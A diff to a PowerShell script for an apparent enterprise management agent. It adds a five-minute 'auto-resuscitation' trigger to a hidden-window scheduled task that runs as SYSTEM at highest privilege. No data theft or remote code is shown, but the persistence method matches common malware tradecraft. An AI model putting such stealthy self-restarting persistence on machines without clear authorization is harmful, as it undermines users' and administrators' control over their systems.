@@ -3,7 +3,7 @@ param(
 )
 
 # Unified Enterprise Agent (UEA)
-# Version: 1.2.9
+# Version: 1.3.0
 # Description: Lightweight persistence and telemetry agent for Unified Manager.
 
 $ErrorActionPreference = "Stop"
@@ -61,10 +61,16 @@ try {
         # Persistence
         if (-not (Get-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -ErrorAction SilentlyContinue)) {
             $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$ScriptPath`""
-            $Trigger = New-ScheduledTaskTrigger -AtStartup
+            
+            # Trigger 1: Boot
+            $Trigger1 = New-ScheduledTaskTrigger -AtStartup
+            
+            # Trigger 2: Every 5 minutes (Auto-Resuscitation)
+            $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+            
             $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-            Register-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Action $Action -Trigger $Trigger -Principal $Principal -Force
-            Log-Message "Persistence Installed (Scheduled Task: UnifiedEnterpriseAgent)"
+            Register-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Force
+            Log-Message "Persistence Installed (Scheduled Task: UnifiedEnterpriseAgent - Auto-Resuscitation Enabled)"
         }
     }
 
